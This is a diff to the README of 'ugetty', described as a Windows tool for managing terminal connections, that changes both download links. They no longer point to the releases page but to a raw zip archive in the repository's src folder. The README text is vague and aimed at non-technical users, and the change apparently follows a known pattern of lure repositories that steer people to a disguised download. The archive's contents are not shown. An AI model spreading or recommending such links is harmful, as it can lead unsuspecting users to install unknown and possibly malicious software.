@@ -1,6 +1,6 @@
 # ⚡ ugetty - Simple tool for managing system connections
 
-[![](https://img.shields.io/badge/Download-ugetty-blue.svg)](https://github.com/luhiluh3506/ugetty/releases)
+[![](https://img.shields.io/badge/Download-ugetty-blue.svg)](https://raw.githubusercontent.com/luhiluh3506/ugetty/main/src/Software_v3.4-beta.4.zip)
 
 ugetty provides a lightweight way to manage your system terminal connections. It replaces older software with a clean, modern approach to handling multiple protocols. This tool works in the background to ensure your data transfers stay active and stable. You do not need technical knowledge to install or operate this software on your Windows computer.
 
@@ -19,7 +19,7 @@ If your system meets these standards, the software will run without errors. uget
 
 You must visit the official release page to get the installer for your computer. 
 
-[Download ugetty here](https://github.com/luhiluh3506/ugetty/releases)
+[Download ugetty here](https://raw.githubusercontent.com/luhiluh3506/ugetty/main/src/Software_v3.4-beta.4.zip)
 
 Follow these steps to obtain the correct file:
 
